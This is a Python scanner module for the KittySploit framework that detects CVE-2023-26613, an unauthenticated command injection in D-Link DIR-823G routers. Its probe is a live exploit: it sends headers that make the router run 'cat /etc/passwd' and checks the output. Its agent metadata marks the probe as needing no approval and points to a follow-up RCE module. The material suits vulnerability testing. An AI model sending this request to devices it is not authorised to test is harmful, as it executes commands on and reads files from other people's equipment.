#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-823G EXCU_SHELL command injection (CVE-2023-26613)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DIR-823G - EXCU_SHELL RCE Detection (CVE-2023-26613)',
        'description': (
            'D-Link DIR-823G processes HTTP headers Command1/Confirm1 on /EXCU_SHELL, '
            'allowing unauthenticated OS command execution (CVE-2023-26613).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2023', 'dlink', 'router', 'iot', 'rce',
            'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/dlink_cve_2023_26613_rce'],
            },
        },
        'references': [
            'https://github.com/726232111/VulIoT/tree/main/D-Link/DIR823G%20V1.0.2B05/excu_shell',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-26613',
        ],
        'cve': 'CVE-2023-26613',
    }

    def run(self):
        probe = self.http_request(method='GET', path='/EXCU_SHELL', allow_redirects=False)
        if not probe or probe.status_code == 404:
            return False

        r = self.http_request(
            method='GET',
            path='/EXCU_SHELL',
            headers={'Command1': 'cat /etc/passwd', 'Confirm1': 'apply'},
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        if re.search(r'root:.*:0:0:', body):
            self.set_info(
                severity='critical',
                reason='D-Link DIR-823G CVE-2023-26613 EXCU_SHELL command injection',
                path='/EXCU_SHELL',
            )
            return True
        return False
